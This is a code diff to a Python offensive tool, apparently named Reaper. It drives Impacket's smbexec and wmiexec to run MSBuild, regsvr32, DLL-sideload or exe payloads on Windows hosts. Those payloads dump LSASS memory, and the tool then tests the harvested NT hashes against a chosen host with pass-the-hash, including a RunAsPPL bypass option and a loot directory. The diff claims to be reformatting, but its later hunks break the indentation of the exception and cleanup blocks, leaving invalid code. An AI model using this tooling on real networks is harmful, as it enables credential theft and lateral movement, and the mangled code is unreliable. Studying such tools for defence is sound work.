@@ -662,7 +662,6 @@ class RemoteShell(cmd.Cmd):
                                   'again with -codec and the corresponding codec')
                 self.__outputBuffer += data.decode(CODEC, errors='replace')
 
-
         if self.__noOutput is True:
             self.__outputBuffer = ''
             return
@@ -818,6 +817,7 @@ def do_ip(inpu, local_ip):  # check if the inputted ips are up so we dont scan t
 
     return uphosts
 
+
 def gen_payload_exe_mdwd(share_name, payload_name, addresses_array, drive_letter):
     addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     namespace = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -911,6 +911,7 @@ def gen_payload_exe_mdwd(share_name, payload_name, addresses_array, drive_letter
         for addr in addresses_array:
             f.write(addr + "\n")
         f.close()
+
 
 def gen_payload_exe_pss(share_name, payload_name, addresses_array, drive_letter):
     addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -1242,6 +1243,7 @@ def gen_payload_regsvr32_pss(share_name, payload_name, addresses_array):
         f.close()
 
     return addresses_file
+
 
 def gen_payload_dllsideload_mdwd(share_name, addresses_array):
     os.system('sudo cp {}/src/calc /var/tmp/{}/calc.exe'.format(cwd, share_name))
@@ -1751,6 +1753,7 @@ def update_chk():
         printnlog('{}Unable to check for updates{}\n'.format(color_YELL, color_reset))
         pass
 
+
 def apt_package_chk():
     errors = False
     cache = apt.Cache()
@@ -1777,6 +1780,7 @@ def apt_package_chk():
     if errors:
         sys.exit(1)
 
+
 # Process command-line arguments.
 if __name__ == '__main__':
     # quick checks to see if were good
@@ -1802,7 +1806,9 @@ if __name__ == '__main__':
     apt_package_chk()
     printnlog(version.BANNER)
 
-    parser = argparse.ArgumentParser(add_help=True, description='', epilog='Methods:\n smbexec: Impacket\'s smbexec that has been modified to work a little better it is the most consistent and clean working\n wmiexec: Impacket\'s wmiexec that has been modified to work with Reaper the only artifact it leaves is a dead SMB connection if the payload does not fully execute\n atexec:  Impacket\'s atexec it works sometimes\n\nPayloads:\n  Payloads are formatted in execmode-payloadtype\n  msbuild:     Abuses MsBuild v4.0+\'s ability to run inline tasks via an xml payload to execute C# code\n  regsvr32:    Abuses RegSvr32\'s ability to execute a dll to execute code\n  dllsideload: Abuses Windows 7 calc.exe to sideload a dll to gain code execution\n  exe:         Pretty self explanatory it\'s an exe that runs\n  Payloads ending in mdwd use a simple MiniDumpWriteDump function to dump lsass\n  Payloads ending in mdwdpss use PssCaptureSnapshot to copy lsass memory to a new process and dump that with MiniDumpWriteDump', formatter_class=RawTextHelpFormatter)
+    parser = argparse.ArgumentParser(add_help=True, description='',
+                                     epilog='Methods:\n smbexec: Impacket\'s smbexec that has been modified to work a little better it is the most consistent and clean working\n wmiexec: Impacket\'s wmiexec that has been modified to work with Reaper the only artifact it leaves is a dead SMB connection if the payload does not fully execute\n atexec:  Impacket\'s atexec it works sometimes\n\nPayloads:\n  Payloads are formatted in execmode-payloadtype\n  msbuild:     Abuses MsBuild v4.0+\'s ability to run inline tasks via an xml payload to execute C# code\n  regsvr32:    Abuses RegSvr32\'s ability to execute a dll to execute code\n  dllsideload: Abuses Windows 7 calc.exe to sideload a dll to gain code execution\n  exe:         Pretty self explanatory it\'s an exe that runs\n  Payloads ending in mdwd use a simple MiniDumpWriteDump function to dump lsass\n  Payloads ending in mdwdpss use PssCaptureSnapshot to copy lsass memory to a new process and dump that with MiniDumpWriteDump',
+                                     formatter_class=RawTextHelpFormatter)
     if '-oe' not in sys.argv:  # if were using another exec method we dont need to get target
         parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName, address, range, cidr>')
     parser.add_argument('-share', action='store', default='C$', choices=['C$', 'ADMIN$'], help='share where the output will be grabbed from (default C$ for smbexec, ADMIN$ for wmiexec) (wmiexec and smbexec ONLY)')
@@ -1854,7 +1860,6 @@ if __name__ == '__main__':
         parser.print_help()
         sys.exit(1)
 
-
     options = parser.parse_args()
 
     if options.debug:
@@ -1863,8 +1868,8 @@ if __name__ == '__main__':
     # Init the example's logger theme
     logger.init(options.ts)
 
-    #if '-share' not in sys.argv and options.method == 'wmiexec':  # ADMIN$ is the default share for wmiexec wheres C$ is the default for smbexec and we need a way to determine if the user has not provided on to used the default for this
-        #options.share = 'ADMIN$' # ADMIN$ has been getting flaged as malware with wmiexec so moving it to default to C$
+    # if '-share' not in sys.argv and options.method == 'wmiexec':  # ADMIN$ is the default share for wmiexec wheres C$ is the default for smbexec and we need a way to determine if the user has not provided on to used the default for this
+    # options.share = 'ADMIN$' # ADMIN$ has been getting flaged as malware with wmiexec so moving it to default to C$
 
     if options.runasppl and options.method != 'smbexec':  # check to see if they are trying to run runasppl bypass with something other than smbexec
         printnlog('{}[!]{} RunAsPPL Bypass only works with the SMBExec method'.format(color_RED, color_reset))
@@ -2129,122 +2134,122 @@ if __name__ == '__main__':
                             msv_creds_cleaned.append(cred)
                     if len(msv_creds_cleaned) > 0:
                         ip_to_check_against = input('\nEnter an IP to check the accounts against (Preferably a domain controller): ')
-                         try: # this ensures that they gave a valid ip address
+                        try:  # this ensures that they gave a valid ip address
                             ipaddress.ip_address(ip_to_check_against)
                         except ValueError as e:
                             ip_to_check_against = addresses[0]
-                    
-                        printnlog('\n{} Attempting to check {} creds\n'.format(green_plus, len(msv_creds_cleaned)))
-                        tried_full = []
-                        for item in msv_creds_cleaned:
-                            try:
-                                if item not in tried_full:  # this prevents duplicate attempts
-                                    idx_of_2nd_colon = item.find(":", item.find(":") + 1)
-                                    username = item[item.find(":") + 1:idx_of_2nd_colon]
-                                    nthash = item[idx_of_2nd_colon + 1:-1]
-                                    if acct_chk_fail.count(username) <= 3:  # antilockout check
-                                        if username not in acct_chk_valid:  # why try again if we already found a valid set
-                                            check_accts(username, None, domain, ip_to_check_against, ip_to_check_against, ':' + nthash, None, False, None, int(445))
-                                            tried_full.append(item)
-                                        else:
-                                            printnlog('{}[!]{} Skipping {}:{} due to valid creds for account already found'.format(color_BLU, color_reset, username, nthash))
-                                    else:
-                                        printnlog('{}[!]{} Skipping {}:{} to prevent lockout'.format(color_BLU, color_reset, username, nthash))
+
+                printnlog('\n{} Attempting to check {} creds\n'.format(green_plus, len(msv_creds_cleaned)))
+                tried_full = []
+                for item in msv_creds_cleaned:
+                    try:
+                        if item not in tried_full:  # this prevents duplicate attempts
+                            idx_of_2nd_colon = item.find(":", item.find(":") + 1)
+                            username = item[item.find(":") + 1:idx_of_2nd_colon]
+                            nthash = item[idx_of_2nd_colon + 1:-1]
+                            if acct_chk_fail.count(username) <= 3:  # antilockout check
+                                if username not in acct_chk_valid:  # why try again if we already found a valid set
+                                    check_accts(username, None, domain, ip_to_check_against, ip_to_check_against, ':' + nthash, None, False, None, int(445))
+                                    tried_full.append(item)
                                 else:
-                                    printnlog('{}[!]{} Skipping {} because of duplicate creds'.format(color_BLU, color_reset, item))
-                            except Exception as e:
-                                printnlog(str(e))
-                        print("")
-                    else:
-                        printnlog('{} There are no creds to check'.format(red_minus))
+                                    printnlog('{}[!]{} Skipping {}:{} due to valid creds for account already found'.format(color_BLU, color_reset, username, nthash))
+                            else:
+                                printnlog('{}[!]{} Skipping {}:{} to prevent lockout'.format(color_BLU, color_reset, username, nthash))
+                        else:
+                            printnlog('{}[!]{} Skipping {} because of duplicate creds'.format(color_BLU, color_reset, item))
+                    except Exception as e:
+                        printnlog(str(e))
+                print("")
+            else:
+                printnlog('{} There are no creds to check'.format(red_minus))
 
-    except KeyboardInterrupt as e:
-        logging.error(str(e))
-        printnlog('\n{}[!]{} Cleaning up please wait'.format(color_YELL, color_reset))
+except KeyboardInterrupt as e:
+logging.error(str(e))
+printnlog('\n{}[!]{} Cleaning up please wait'.format(color_YELL, color_reset))
 
-        if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
-            os.system('sudo rm {}/drives.txt'.format(cwd))
+if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
+    os.system('sudo rm {}/drives.txt'.format(cwd))
 
-        try:
-            os.system('sudo systemctl stop smbd')
-            printnlog(green_plus + ' Stopped the smbd service')
-        except BaseException as e:
-            pass
+try:
+    os.system('sudo systemctl stop smbd')
+    printnlog(green_plus + ' Stopped the smbd service')
+except BaseException as e:
+    pass
 
-        try:
-            os.system('sudo cp ' + cwd + '/smb.conf /etc/samba/smb.conf')
-            printnlog(green_plus + ' Cleaned up the smb.conf file')
-        except BaseException as e:
-            pass
+try:
+    os.system('sudo cp ' + cwd + '/smb.conf /etc/samba/smb.conf')
+    printnlog(green_plus + ' Cleaned up the smb.conf file')
+except BaseException as e:
+    pass
 
-        try:
-            os.system('sudo rm ' + cwd + '/smb.conf')
-        except BaseException as e:
-            pass
+try:
+    os.system('sudo rm ' + cwd + '/smb.conf')
+except BaseException as e:
+    pass
 
-        try:
-            os.system('sudo userdel ' + share_user)
-            printnlog(green_plus + ' Removed the user: ' + share_user)
-        except BaseException as e:
-            pass
+try:
+    os.system('sudo userdel ' + share_user)
+    printnlog(green_plus + ' Removed the user: ' + share_user)
+except BaseException as e:
+    pass
 
-        try:
-            os.system('sudo groupdel ' + share_group)
-            printnlog(green_plus + ' Removed the group: ' + share_group)
-        except BaseException as e:
-            pass
+try:
+    os.system('sudo groupdel ' + share_group)
+    printnlog(green_plus + ' Removed the group: ' + share_group)
+except BaseException as e:
+    pass
 
-        try:
-            os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
-            printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
-        except BaseException as e:
-            pass
+try:
+    os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
+    printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
+except BaseException as e:
+    pass
 
-        try:
-            os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
-        except BaseException as e:
-            pass
+try:
+    os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
+except BaseException as e:
+    pass
 
-        print('{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
-        sys.exit(0)
+print('{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
+sys.exit(0)
 
-    printnlog('{}[-]{} Cleaning up please wait'.format(color_BLU, color_reset))
-    if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
-        os.system('sudo rm {}/drives.txt'.format(cwd))
+printnlog('{}[-]{} Cleaning up please wait'.format(color_BLU, color_reset))
+if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
+    os.system('sudo rm {}/drives.txt'.format(cwd))
 
-    try:
-        os.system('sudo systemctl stop smbd')
-        printnlog(green_plus + ' Stopped the smbd service')
-    except BaseException as e:
-        pass
+try:
+    os.system('sudo systemctl stop smbd')
+    printnlog(green_plus + ' Stopped the smbd service')
+except BaseException as e:
+    pass
 
-    try:
-        os.system('sudo cp ' + cwd + '/smb.conf /etc/samba/smb.conf')
-        printnlog(green_plus + ' Cleaned up the smb.conf file')
-    except BaseException as e:
-        pass
+try:
+    os.system('sudo cp ' + cwd + '/smb.conf /etc/samba/smb.conf')
+    printnlog(green_plus + ' Cleaned up the smb.conf file')
+except BaseException as e:
+    pass
 
-    try:
-        os.system('sudo rm ' + cwd + '/smb.conf')
-    except BaseException as e:
-        pass
+try:
+    os.system('sudo rm ' + cwd + '/smb.conf')
+except BaseException as e:
+    pass
 
-    try:
-        os.system('sudo userdel ' + share_user)
-        printnlog(green_plus + ' Removed the user: ' + share_user)
-    except BaseException as e:
-        pass
+try:
+    os.system('sudo userdel ' + share_user)
+    printnlog(green_plus + ' Removed the user: ' + share_user)
+except BaseException as e:
+    pass
 
-    try:
-        os.system('sudo groupdel ' + share_group)
-        printnlog(green_plus + ' Removed the group: ' + share_group)
-    except BaseException as e:
-        pass
+try:
+    os.system('sudo groupdel ' + share_group)
+    printnlog(green_plus + ' Removed the group: ' + share_group)
+except BaseException as e:
+    pass
 
-    try:
-        os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
-    except BaseException as e:
-        pass
+try:
+    os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
+except BaseException as e:
+    pass
 
-    print('{}[-]{} Cleanup completed! If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
-    sys.exit(0)
+print('{}[-]{} Cleanup completed! If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
+sys.exit(0)
